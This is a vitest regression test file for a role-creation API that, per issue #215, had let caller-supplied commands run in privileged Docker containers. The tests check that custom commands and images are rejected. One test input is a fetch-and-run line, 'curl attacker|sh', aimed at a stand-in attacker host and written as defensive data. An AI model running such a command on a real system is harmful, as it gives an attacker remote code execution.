import { describe, it, expect, beforeAll } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Hono } from "hono";
import { testDb as db, hasTestDb } from "./test-db.js";
import { organizations, repositories, users } from "../src/models/schema.js";
import { hashPassword, signToken } from "../src/services/auth.js";
import { GitService } from "../src/services/git.js";
import {
  assertDeterministicHarness, assertValidMode, resolveHarnessCommand,
} from "../src/services/standing-agents.js";

// NOTE: POST /api/v1/roles mints + SEALS a role agent's token, so it 400s
// "server missing CLAWHUB_SECRETS_KEY" as its very FIRST check — before the
// harness gate. secrets.ts captures the key in a module-level const at import,
// so it must be set BEFORE any import here; vitest.config.ts seeds a fixed
// test key in `env` for exactly this reason. Without it the gate assertions
// below would pass vacuously on the missing-key error.

// #215 — POST /api/v1/roles bypassed the v3 deterministic-harness gate that
// POST /standing-agents 400s on: a caller-supplied `command` + `mode:"verify"`
// reached createStandingAgent and the runner booted it as
// `docker run --privileged --entrypoint sh -c <string>` on the shared host.
process.env.JWT_SECRET ??= "test-secret-roles";

describe("deterministic-harness gate helpers (#215)", () => {
  it("assertDeterministicHarness rejects a caller-supplied command/image with the hatch off", () => {
    const prev = process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    try {
      expect(() => assertDeterministicHarness({ command: "id" })).toThrow();
      expect(() => assertDeterministicHarness({ image: "evil:latest" })).toThrow();
      // Neither present → allowed.
      expect(() => assertDeterministicHarness({})).not.toThrow();
    } finally {
      if (prev === undefined) delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES; else process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES = prev;
    }
  });

  it("assertDeterministicHarness re-admits command/image only under the self-host escape hatch", () => {
    const prev = process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES = "1";
    try {
      expect(() => assertDeterministicHarness({ command: "id", image: "x:1" })).not.toThrow();
    } finally {
      if (prev === undefined) delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES; else process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES = prev;
    }
  });

  it("assertValidMode rejects an unknown mode and accepts the canonical ones", () => {
    expect(() => assertValidMode("nonsense")).toThrow();
    for (const m of ["worker", "develop", "review", "verify", "triage", "reflect"]) {
      expect(() => assertValidMode(m)).not.toThrow();
    }
  });

  it("resolveHarnessCommand drops a stored command at the dispatch boundary (hatch off)", () => {
    const prev = process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    try {
      // A row that somehow carries a command must NOT reach the runner.
      expect(resolveHarnessCommand("id")).toBeUndefined();
      process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES = "1";
      expect(resolveHarnessCommand("id")).toBe("id");
    } finally {
      if (prev === undefined) delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES; else process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES = prev;
    }
  });
});

describe.skipIf(!hasTestDb)("POST /api/v1/roles harness gate (#215)", () => {
  const S = Date.now();
  let app: Hono;
  let userId: string;
  let token: string;

  beforeAll(async () => {
    process.env.CLAWHUB_API_RATE_LIMIT ??= "100000";
    process.env.CLAWHUB_AUTH_RATE_LIMIT ??= "100000";
    delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    const { buildApp } = await import("../src/app.js");
    const { EventBus } = await import("../src/services/events.js");
    const gitBase = await mkdtemp(join(tmpdir(), "clawhub-roles-test-"));
    const git = new GitService(gitBase);
    app = buildApp({ db, git, events: new EventBus(), inProcessWorker: false });

    const [u] = await db.insert(users).values({
      email: `roles-${S}@t.co`, username: `roles${S}`, passwordHash: await hashPassword("x"),
    }).returning();
    userId = u.id;
    token = signToken({ kind: "user", userId, email: u.email, v: u.tokenVersion });
  });

  const CLIENT_IP = `203.0.114.${(S % 200) + 1}`;
  function post(body: unknown) {
    return app.request("/api/v1/roles", {
      method: "POST",
      headers: { "content-type": "application/json", "cf-connecting-ip": CLIENT_IP, authorization: `Bearer ${token}` },
      body: JSON.stringify(body),
    });
  }

  it("rejects a role carrying a harness command (would boot --entrypoint sh -c on the runner)", async () => {
    const res = await post({ capability: "worker", name: "evil", mode: "verify", command: "curl attacker|sh" });
    expect(res.status).toBe(400);
  });

  it("rejects a role carrying a custom image", async () => {
    const res = await post({ capability: "worker", name: "evil2", image: "attacker/image:latest" });
    expect(res.status).toBe(400);
  });

  it("rejects an unknown mode", async () => {
    const res = await post({ capability: "worker", name: "modey", mode: "nonsense" });
    expect(res.status).toBe(400);
  });

  it("re-admits command under the self-host escape hatch", async () => {
    process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES = "1";
    try {
      const res = await post({ capability: "worker", name: `hatch${S}`, command: "true" });
      expect(res.status).toBe(201);
    } finally {
      delete process.env.CLAWHUB_ALLOW_CUSTOM_HARNESS_IMAGES;
    }
  });
});
